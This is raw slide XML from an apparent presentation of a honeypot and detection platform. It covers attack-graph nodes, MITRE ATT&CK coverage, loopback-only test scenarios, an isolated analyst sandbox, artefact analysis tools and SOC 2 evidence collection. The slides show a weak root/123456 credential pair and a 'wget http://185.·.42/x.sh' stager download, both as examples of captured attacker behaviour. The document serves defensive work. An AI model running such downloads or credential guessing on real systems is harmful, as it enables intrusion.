            <a:ext cx="310896" cy="310896"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse">
            <a:avLst/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5661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19EA9"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>185.·.42</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="25" name="Oval 24"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8467344" y="2724912"/>
            <a:ext cx="219456" cy="21945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9831" y="299008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19EA9"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>ssh:22</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="27" name="Oval 26"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8467344" y="3785615"/>
            <a:ext cx="219456" cy="21945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1" y="4050791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19EA9"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>telnet:23</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="29" name="Oval 28"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9802368" y="2505456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4856" y="277063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19EA9"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>root/123456</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="31" name="Oval 30"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9802368" y="3163823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34856" y="3428999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19EA9"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>uname -a</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="33" name="Oval 32"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9738359" y="3886200"/>
            <a:ext cx="237744" cy="23774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9992" y="4169663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19EA9"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>wget &lt;url&gt;</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="35" name="Oval 34"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="10533888" y="4169663"/>
            <a:ext cx="219456" cy="21945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66376" y="443484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A19EA9"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>sha256:9f2c…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01968" y="4773168"/>
            <a:ext cx="466344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90118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classification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1968" y="5102352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8A87C"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>hands-on-keyboard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5167" y="4901183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degree centrality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45167" y="51023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0EDE8"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>0.71 · 185.·.42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5888736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0EDE8"/>
                </a:solidFill>
                <a:latin typeface="Cambria"/>
              </a:rPr>
              <a:t>Measured signals support a claim about </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300" b="0">
                <a:solidFill>
                  <a:srgbClr val="E8A87C"/>
                </a:solidFill>
                <a:latin typeface="Cambria"/>
              </a:rPr>
              <a:t>method</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300" b="0">
                <a:solidFill>
                  <a:srgbClr val="F0EDE8"/>
                </a:solidFill>
                <a:latin typeface="Cambria"/>
              </a:rPr>
              <a:t>. They do not support a claim about </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300" b="0">
                <a:solidFill>
                  <a:srgbClr val="E8A87C"/>
                </a:solidFill>
                <a:latin typeface="Cambria"/>
              </a:rPr>
              <a:t>identity</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300" b="0">
                <a:solidFill>
                  <a:srgbClr val="F0EDE8"/>
                </a:solidFill>
                <a:latin typeface="Cambria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14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 animBg="1"/>
      <p:bldP spid="16" grpId="0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 animBg="1"/>
      <p:bldP spid="36" grpId="0"/>
      <p:bldP spid="37" grpId="0" animBg="1"/>
      <p:bldP spid="38" grpId="0"/>
      <p:bldP spid="39" grpId="0"/>
      <p:bldP spid="40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13 · DEEP DIVE ·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Mapped to MITRE ATT&amp;CK, tactic by tactic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54 techniques are referenced across the rule set, scenarios and analysis engines.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15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1168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Reconnaissance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450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ourier New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5420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280160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508760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737360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65960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87168" y="1847088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201168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Initial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2450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8A87C"/>
                </a:solidFill>
                <a:latin typeface="Courier New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54096" y="25420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70048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898648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27248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55848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84448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813048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34256" y="1847088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201168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2450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ourier New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01184" y="25420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17136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74336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02936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31536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0136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81344" y="1847088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201168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Persistence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4224" y="2450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ourier New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5420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64224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592824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821424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050024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78624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7507224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28431" y="1847088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1311" y="201168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Privilege Esc.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11311" y="2450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ourier New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59" y="25420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11311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439911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668511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897111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125711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54311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875519" y="1847088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399" y="201168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Defense Evasion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399" y="2450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ourier New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42447" y="2542032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058399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286999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515599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744199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0972799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1201399" y="2944368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640080" y="3547872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59" y="3712463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Credential Access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59" y="4151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D4634A"/>
                </a:solidFill>
                <a:latin typeface="Courier New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07007" y="42428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2959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51560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280160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508760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737360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965960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487168" y="3547872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70048" y="3712463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Discovery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70048" y="4151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ourier New"/>
              </a:rPr>
              <a:t>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054096" y="42428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670048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898648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3127248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3355848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3584448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3813048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4334256" y="3547872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17136" y="3712463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Lateral Movement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17136" y="4151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60A5FA"/>
                </a:solidFill>
                <a:latin typeface="Courier New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01184" y="42428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17136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745736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974336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202936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5431536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5660136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6181344" y="3547872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64224" y="3712463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Collection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364224" y="4151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4D399"/>
                </a:solidFill>
                <a:latin typeface="Courier New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748272" y="42428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364224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592824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821424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050024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7278624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507224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8028431" y="3547872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11311" y="3712463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Comm. &amp; Control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11311" y="4151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ourier New"/>
              </a:rPr>
              <a:t>5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595359" y="42428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211311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8439911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8668511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8897111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9125711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9354311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23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9875519" y="3547872"/>
            <a:ext cx="1700784" cy="1481328"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 617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058399" y="3712463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F0EDE8"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Exfil. &amp; Impact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058399" y="4151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Courier New"/>
              </a:rPr>
              <a:t>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442447" y="42428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E6B76"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>techniques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0058399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Rounded Rectangle 122"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="10286999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10515599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10744199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0972799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11201399" y="4645152"/>
            <a:ext cx="164592" cy="128016"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 21428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40080" y="5303520"/>
            <a:ext cx="10911535" cy="859536"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 10638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32688" y="5468112"/>
            <a:ext cx="694944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19EA9"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Coverage is claimed only where a rule, a scenario or an analysis engine actually references the technique — the matrix reflects the code, not an aspiration.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63840" y="5431536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E8A87C"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>T1110 · T1078 · T1059 · T1105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863840" y="566928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6E6B76"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>T1046 · T1190 · T1486 · T1567 · …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15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4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4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4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4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4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4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4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4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4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4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4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4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3" dur="4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6" dur="4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9" dur="4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4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4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4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4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4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4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4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4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4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4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4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4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4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4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0" dur="4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3" dur="4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4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4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4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45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4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4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4" dur="4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4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0" dur="4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3" dur="4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6" dur="4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4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4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5" dur="45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/>
      <p:bldP spid="40" grpId="0"/>
      <p:bldP spid="41" grpId="0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/>
      <p:bldP spid="50" grpId="0"/>
      <p:bldP spid="51" grpId="0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/>
      <p:bldP spid="60" grpId="0"/>
      <p:bldP spid="61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/>
      <p:bldP spid="70" grpId="0"/>
      <p:bldP spid="71" grpId="0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/>
      <p:bldP spid="80" grpId="0"/>
      <p:bldP spid="81" grpId="0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/>
      <p:bldP spid="90" grpId="0"/>
      <p:bldP spid="91" grpId="0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/>
      <p:bldP spid="100" grpId="0"/>
      <p:bldP spid="101" grpId="0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/>
      <p:bldP spid="110" grpId="0"/>
      <p:bldP spid="111" grpId="0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/>
      <p:bldP spid="120" grpId="0"/>
      <p:bldP spid="121" grpId="0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/>
      <p:bldP spid="130" grpId="0"/>
      <p:bldP spid="131" grpId="0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14 ·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The platform grades its own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Eight controlled scenarios are fired at the honeypots; one detection cycle later, what the real pipeline produced is graded against what the scenario expected.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84831"/>
            <a:ext cx="2615184" cy="1609344"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 5681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494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EDE8"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Fire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1635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A scenario replays a known attack — brute force, recon, exfiltration, PowerShell.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884017"/>
            <a:ext cx="64007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3310127" y="2839212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1568" y="2084831"/>
            <a:ext cx="2615184" cy="1609344"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 5681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22494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EDE8"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Wait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281635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One full detection cycle. No shortcuts into the engine, no synthetic detections.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884017"/>
            <a:ext cx="64008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6071616" y="2839212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63056" y="2084831"/>
            <a:ext cx="2615184" cy="1609344"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 5681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22494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EDE8"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Grade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81635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Real detections are matched against expectations — rate and ATT&amp;CK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96528" y="2884017"/>
            <a:ext cx="64007" cy="10972"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="3A3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8833104" y="2839212"/>
            <a:ext cx="100584" cy="100584"/>
          </a:xfrm>
          <a:prstGeom prst="triangl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24544" y="2084831"/>
            <a:ext cx="2615184" cy="1609344"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 5681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24942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D4634A"/>
                </a:solidFill>
                <a:latin typeface="Courier New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5054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0EDE8"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Verdict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816352"/>
            <a:ext cx="22128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PASS, PARTIAL or FAIL, written to a scenario_runs row with the evidence.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77056"/>
            <a:ext cx="5376672" cy="1883664"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 485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59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SCENARIO LIBRARY</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="32" name="Oval 31"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="955548" y="4430268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52144" y="435254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ssh_brute_force</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="34" name="Oval 33"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3534156" y="4430268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0752" y="435254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credential_attack</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="36" name="Oval 35"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="955548" y="4759452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52144" y="468172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reconnaissance</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="38" name="Oval 37"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3534156" y="4759452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0752" y="468172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web_attack</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="40" name="Oval 39"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="955548" y="5088636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2144" y="501091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malware_download</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="42" name="Oval 41"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3534156" y="5088636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30752" y="501091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suspicious_command</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="44" name="Oval 43"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="955548" y="5417820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52144" y="534009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suspicious_powershell</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="46" name="Oval 45"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3534156" y="5417820"/>
            <a:ext cx="64008" cy="6400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30752" y="534009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ourier New"/>
              </a:rPr>
              <a:t>exfiltration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99632" y="3877056"/>
            <a:ext cx="5349240" cy="1883664"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 4854"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="18181D">
              <a:alpha val="45000"/>
            </a:srgbClr>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:srgbClr val="8E3B33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405993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EF4444"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>WHY THIS IS SAFE TO SHIP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43708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Target is hard-coded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4572000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analyst never supplies one — execution is locked to 127.0.0.1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73952" y="48280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Second line of defence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5029200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scenario script independently refuses anything outside RFC1918 / loopback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73952" y="528523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Evaluate-only mode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3952" y="5486400"/>
            <a:ext cx="47731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a run can grade existing telemetry without firing anything at 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0EDE8"/>
                </a:solidFill>
                <a:latin typeface="Cambria"/>
              </a:rPr>
              <a:t>A detection pipeline that has never been tested against a known attack </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300" b="0">
                <a:solidFill>
                  <a:srgbClr val="E8A87C"/>
                </a:solidFill>
                <a:latin typeface="Cambria"/>
              </a:rPr>
              <a:t>is an untested pipeline.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16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 animBg="1"/>
      <p:bldP spid="25" grpId="0" animBg="1"/>
      <p:bldP spid="26" grpId="0" animBg="1"/>
      <p:bldP spid="27" grpId="0"/>
      <p:bldP spid="28" grpId="0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 animBg="1"/>
      <p:bldP spid="43" grpId="0"/>
      <p:bldP spid="44" grpId="0" animBg="1"/>
      <p:bldP spid="45" grpId="0"/>
      <p:bldP spid="46" grpId="0" animBg="1"/>
      <p:bldP spid="47" grpId="0"/>
      <p:bldP spid="48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15 · DEEP DIVE · SANDBOX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An analyst shell that feeds the same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00784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A disposable Linux sandbox with no route out. Every command typed and every outbound connection attempted becomes an ordinary telemetry event.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21408"/>
            <a:ext cx="5431536" cy="3054096"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 2994"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="111318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276856"/>
            <a:ext cx="91440" cy="9144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3271" y="2276856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97863" y="2276856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21284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ourier New"/>
              </a:rPr>
              <a:t>analysis-lab · session a7f3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2523744"/>
            <a:ext cx="5065776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8833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analyst@sandbox:~$ </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="950" b="0">
                <a:solidFill>
                  <a:srgbClr val="F0EDE8"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>uname 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6265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Linux sandbox 6.1.0 x86_64 GNU/Linux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3697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analyst@sandbox:~$ </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="950" b="0">
                <a:solidFill>
                  <a:srgbClr val="F0EDE8"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>wget http://185.·.42/x.sh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1129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F4444"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>connect: Network is unreachable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785615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59935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→ captured as event  </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="950" b="0">
                <a:solidFill>
                  <a:srgbClr val="E8A87C"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>honeypot_type=AnalysisShell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3425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→ matched  </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="950" b="0">
                <a:solidFill>
                  <a:srgbClr val="E8A87C"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>st-exec-004</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="950" b="0">
                <a:solidFill>
                  <a:srgbClr val="6E6B76"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>  stager download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08576"/>
            <a:ext cx="4937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ourier New"/>
              </a:rPr>
              <a:t>→ technique  </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="950" b="0">
                <a:solidFill>
                  <a:srgbClr val="E8A87C"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>T1105</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="950" b="0">
                <a:solidFill>
                  <a:srgbClr val="6E6B76"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>  · graph node added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2784" y="2121408"/>
            <a:ext cx="5276088" cy="3054096"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 299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22860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CONTAINER HARDENING — ENFORCED IN CODE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2679191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03136" y="257860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EDE8"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>internal network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79408" y="2587751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no egress whatsoever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063239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3136" y="2962656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EDE8"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>no Docker socket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79408" y="2971799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sandbox cannot reach the daemon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3447287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03136" y="3346703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EDE8"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>no host mounts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3355847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nothing of the host is visible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3831336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03136" y="373075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EDE8"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>cap_drop: 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79408" y="3739896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plus no-new-privileges, non-root user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0" y="4215384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03136" y="411480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EDE8"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>512 MB · 1 CPU · 128 PIDs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79408" y="4123944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hard resource ceilings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4599432"/>
            <a:ext cx="73152" cy="7315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03136" y="4498848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0EDE8"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>hard TTL + idle reap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9408" y="4507992"/>
            <a:ext cx="24140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one live sandbox per user, then reclaimed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47104" y="4754880"/>
            <a:ext cx="4736592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47104" y="486460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Validated by container_manager.validate_analysis_run before any container starts.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340096"/>
            <a:ext cx="10911535" cy="841248"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 10869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5504688"/>
            <a:ext cx="103327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19EA9"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Sandbox events are tagged honeypot_type="AnalysisShell" and source_ip="analyst-shell:&lt;email&gt;", so analyst activity is never mistaken for attacker telemetry — while still exercising the real detection engine, behaviour profiler and ATT&amp;CK mapping end to end.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17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84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95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95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/>
      <p:bldP spid="24" grpId="0" animBg="1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 animBg="1"/>
      <p:bldP spid="37" grpId="0"/>
      <p:bldP spid="38" grpId="0"/>
      <p:bldP spid="39" grpId="0" animBg="1"/>
      <p:bldP spid="40" grpId="0"/>
      <p:bldP spid="41" grpId="0"/>
      <p:bldP spid="42" grpId="0" animBg="1"/>
      <p:bldP spid="43" grpId="0"/>
      <p:bldP spid="44" grpId="0" animBg="1"/>
      <p:bldP spid="45" grpId="0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16 · TOOLS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Three analysis engines on captured artefacts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55648"/>
            <a:ext cx="3529584" cy="3346704"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 273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193852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" descr="box_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6654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17904" y="19933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0EDE8"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Binary 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" y="2615184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static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535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PE / ELF headers, imports, sections, entropy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2186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YARA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107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signature matching over the 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675887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ClamAV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867911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an independent second opinion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133087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secret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251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30+ hardcoded-credential patterns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5902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CAPE (optional)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7823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real dynamic detonation when configured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5112" y="1755648"/>
            <a:ext cx="3529584" cy="3346704"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 273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81144" y="193852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" descr="scan__in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066544"/>
            <a:ext cx="256032" cy="25603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02936" y="19933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0EDE8"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>APK inspector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1144" y="2615184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1144" y="27614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urier New"/>
              </a:rPr>
              <a:t>MobSF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29535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backing the Android analysis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32186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urier New"/>
              </a:rPr>
              <a:t>manifest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1144" y="34107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permissions, exported components, intents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81144" y="3675887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urier New"/>
              </a:rPr>
              <a:t>certificate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1144" y="3867911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signing metadata extracted from the package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4133087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urier New"/>
              </a:rPr>
              <a:t>static findings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144" y="43251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merged into the same evidence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144" y="45902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urier New"/>
              </a:rPr>
              <a:t>same custody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81144" y="47823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samples stay out of the web root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10144" y="1755648"/>
            <a:ext cx="3529584" cy="3346704"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 273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66175" y="193852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A211E"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:srgbClr val="4A2E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globe__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2" y="2066544"/>
            <a:ext cx="256032" cy="25603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87967" y="19933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50" b="1">
                <a:solidFill>
                  <a:srgbClr val="F0EDE8"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>URL scanner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66175" y="2615184"/>
            <a:ext cx="30175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66175" y="27614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live DNS + SSL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5" y="29535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resolution and certificate inspection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66175" y="32186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HTTP probe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6175" y="34107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status, redirect chain, response headers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5" y="3675887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entropy check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5" y="3867911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algorithmically generated domain names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5" y="4133087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homograph check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5" y="43251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look-alike Unicode substitution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5" y="4590288"/>
            <a:ext cx="3017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WHOIS + geo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5" y="4782312"/>
            <a:ext cx="30358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real registration and IP geolocation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230368"/>
            <a:ext cx="10911535" cy="859536"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 10638"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="18181D">
              <a:alpha val="40000"/>
            </a:srgbClr>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:srgbClr val="D4634A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" y="539496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THE DESIGN PRINCIPLE THAT GOVERNS ALL THREE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" y="5614416"/>
            <a:ext cx="103327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00" b="0">
                <a:solidFill>
                  <a:srgbClr val="A19EA9"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Where a capability needs an external service that is not configured — CAPE, VirusTotal, SMTP — the interface says “not configured”. It never renders a plausible-looking result. A number on screen is a number from a query.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18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 animBg="1"/>
      <p:bldP spid="9" grpId="0"/>
      <p:bldP spid="10" grpId="0"/>
      <p:bldP spid="11" grpId="0" animBg="1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 animBg="1"/>
      <p:bldP spid="23" grpId="0" animBg="1"/>
      <p:bldP spid="24" grpId="0"/>
      <p:bldP spid="25" grpId="0"/>
      <p:bldP spid="26" grpId="0" animBg="1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 animBg="1"/>
      <p:bldP spid="38" grpId="0" animBg="1"/>
      <p:bldP spid="39" grpId="0"/>
      <p:bldP spid="40" grpId="0"/>
      <p:bldP spid="41" grpId="0" animBg="1"/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 animBg="1"/>
      <p:bldP spid="53" grpId="0"/>
      <p:bldP spid="54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17 ·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SOC 2 readiness, assessed from the running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49 Trust Services Criteria mapped to 25 collectors that query live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19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10512"/>
            <a:ext cx="5138928" cy="1920240"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 4761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9339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49 CRITERIA · SIX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D4634A"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>CC1–CC9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26771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common criteria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331720"/>
            <a:ext cx="1188720" cy="100584"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 45454"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="D46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26771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F0EDE8"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>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54203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urier New"/>
              </a:rPr>
              <a:t>A1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3664" y="254203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availability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2606039"/>
            <a:ext cx="108065" cy="100584"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 45454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254203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F0EDE8"/>
                </a:solidFill>
                <a:latin typeface="Courier New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1635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0A5FA"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>C1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" y="281635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confidentiality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2880360"/>
            <a:ext cx="72043" cy="10058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81635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F0EDE8"/>
                </a:solidFill>
                <a:latin typeface="Courier New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090672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34D399"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>PI1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4" y="3090672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processing integrity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3154679"/>
            <a:ext cx="108065" cy="100584"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 45454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090672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F0EDE8"/>
                </a:solidFill>
                <a:latin typeface="Courier New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64991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59E0B"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>P1–P8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83664" y="3364991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privacy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3428999"/>
            <a:ext cx="288174" cy="100584"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 45454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12080" y="3364991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F0EDE8"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rP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58768"/>
            <a:ext cx="5138928" cy="2029968"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 4504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4164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HOW A CONTROL IS SCORED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33425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334256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34D399"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>met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65376" y="433425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evidence satisfies the criterion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7183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718304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F59E0B"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>partial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65376" y="4718304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evidence exists but is incomplete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10235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10235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EF4444"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>gap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65376" y="5102352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evidence contradicts the criterion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48640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232329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486400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50" b="0">
                <a:solidFill>
                  <a:srgbClr val="6E6B76"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>manual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65376" y="5486400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cannot be judged from system data — never auto-passed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1810512"/>
            <a:ext cx="5404104" cy="4078224"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 224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19088" y="199339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25 EVIDENCE COLLECTORS — WHAT THEY QUERY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19088" y="2286000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org_roles · rbac · logical_access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19088" y="2450592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who holds which role, and what it permits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2633472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user_lifecycle · admin_activity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2798064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account creation, change and removal records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2980944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change_mgmt · control_testing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3145536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configuration change and scenario-run history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3328416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monitoring_pipeline · detection_controls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3493008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collector throughput and engine statistics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19088" y="3675887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incident_eval · incident_response · recovery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9088" y="3840479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incident counts, MTTR and closure records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4023360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boundary · data_transmission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4187952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network isolation and transport configuration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19088" y="4370832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malware_controls · vuln_detection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4535424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scanner status and analysis coverage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19088" y="4718304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pipeline_integrity · output_integrity · storage_integrity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19088" y="4882896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row counts and evidence-hash verification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19088" y="5065776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data_classification · retention · pii_collection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088" y="5230368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what is stored, for how long, and why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19088" y="5413248"/>
            <a:ext cx="48828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E8A87C"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>capacity · availability · risk_process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5577840"/>
            <a:ext cx="4901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resource headroom and open-risk posture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" y="5998464"/>
            <a:ext cx="10911535" cy="438912"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 20833"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="18181D">
              <a:alpha val="35000"/>
            </a:srgbClr>
